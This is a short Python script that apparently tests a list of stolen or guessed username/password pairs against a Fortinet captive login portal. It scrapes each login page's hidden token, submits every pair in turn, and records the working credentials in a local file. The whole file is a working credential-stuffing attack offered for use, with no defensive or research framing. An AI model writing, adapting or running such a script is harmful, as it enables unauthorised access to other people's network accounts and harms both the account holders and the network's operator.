import requests
import sys
import os
import random
from time import sleep
from datetime import datetime
random.seed(datetime.now())

f = open("FilterNew.txt", "r")
CRED = []
for line in f:
    CRED.append(line[:-1])
f.close()

USER = "USER"
PASS = "PASS"


def login():
    url = "http://detectportal.firefox.com/status.txt"
    resp = requests.get(url)
    if resp.url == url:
        print("Already logged in")
        sys.stdout.flush()
        sys.exit()
        return False, False
    server_url = resp.url
    i = server_url.find("fgtauth")
    if i == -1:
        return False, False
    server_ip = server_url[0:i]
    sys.stdout.flush()
    login_page = requests.get(server_url).text
    start_text = "name=\"magic\" value=\""
    i = login_page.find(start_text) + len(start_text)
    j = login_page.find("\"", i)
    if i == -1 or j == -1:
        return False, False
    magic = login_page[i:j]
    resp = requests.post(server_ip, data={
        "magic": magic,
        "username": USER,
        "password": PASS
    })
    i = resp.text.find(server_ip+"keepalive")
    j = resp.text.find("\"", i)
    keepalive_url = resp.text[i:j]
    if i == -1 or j == -1:
        print(USER, PASS, "Falied")
        return False, False
    f = open("successShubham2.txt", "a+")
    f.write(USER)
    f.write(' ')
    f.write(PASS)
    f.write('\n')
    print(USER, PASS, "Success")
    f.close()
    requests.get(server_ip+"logout?a")
    return server_ip, keepalive_url

i = 0
while i < len(CRED):
    # i = random.randrange(0, len(CRED), 1)
    # print(i, len(CRED))
    data = CRED[i].split()
    USER = data[0]
    PASS = data[1]
    i = i+1
    server_url, keepalive_url = login()
